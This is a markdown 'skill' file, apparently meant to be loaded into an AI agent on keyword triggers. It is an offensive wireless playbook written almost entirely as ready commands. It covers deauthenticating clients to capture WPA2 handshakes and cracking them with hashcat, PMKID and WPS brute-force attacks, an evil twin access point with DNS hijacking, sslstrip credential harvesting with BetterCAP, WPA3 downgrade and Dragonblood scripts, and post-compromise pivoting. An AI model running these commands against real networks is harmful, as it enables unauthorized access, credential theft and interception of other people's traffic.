# Wireless Attack Skill

## Triggers
"wifi", "wireless", "wpa2", "wpa3", "handshake", "pmkid", "evil twin", "deauth", "aircrack", "wps", "rogue ap", "802.11"

## Overview
Wireless network attacks including WPA2/WPA3 cracking, evil twin, WPS attacks, and rogue AP deployment.

## Prerequisitesites
- aircrack-ng suite
- hcxdumptool / hcxtools
- reaver / bully
- hostapd / dnsmasq
- BetterCAP

## Attack Chain

### Phase 1: Recon
```bash
# Monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon --band abg

# Targeted capture
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon

# PMKID capture
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# WPS detection
wash -i wlan0mon
```

### Phase 2: WPA2 Handshake Capture
```bash
# Deauth to force handshake
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Verify handshake
aircrack-ng capture-01.cap

# Crack with hashcat
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

### Phase 3: PMKID Attack
```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Extract and crack
hcxpcapngtool -o pmkid.22000 pmkid.pcapng
hashcat -m 22000 pmkid.22000 rockyou.txt
```

### Phase 4: WPS Attack
```bash
# Reaver brute
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1 -f

# Bully
bully -b TARGET_BSSID -c CHANNEL wlan0mon

# Pixie dust
reaver -i wlan0mon -b TARGET_BSSID -K 1 -vv
```

### Phase 5: Evil Twin
```bash
# Create rogue AP
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=TARGET_SSID
hw_mode=g
channel=6
wpa=2
wpa_passphrase=fakepassword
EOF

hostapd hostapd.conf

# DNS hijacking
cat > dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.100,192.168.1.200,12h
address=/#/192.168.1.1
EOF

dnsmasq -C dnsmasq.conf

# Capture credentials with BetterCAP
bettercap -iface wlan0 -eval "set http.proxy.sslstrip true; set net.sniff.local true; http.proxy on; net.sniff on"
```

### Phase 6: WPA3 Attacks
```bash
# Dragonblood - side-channel
python dragonblood.py --interface wlan0mon --target TARGET_BSSID

# Downgrade attack
python wpa3-downgrade.py -i wlan0mon -b TARGET_BSSID
```

## Post-Exploitation
```bash
# Once on network, pivot
nmap -sV -sC --open 192.168.1.0/24
responder -I wlan0 -wrf

# Capture all traffic
tcpdump -i wlan0 -w capture.pcap

# SSL strip
sslstrip -l 8080 -w sslstrip.log
```

## Chain Patterns
- Handshake capture → crack → WiFi access → internal recon → lateral
- Evil twin → credential harvest → VPN creds → remote access
- PMKID → crack → persistent wireless access → MITM
- WPS brute → WPA key → network access → pivot
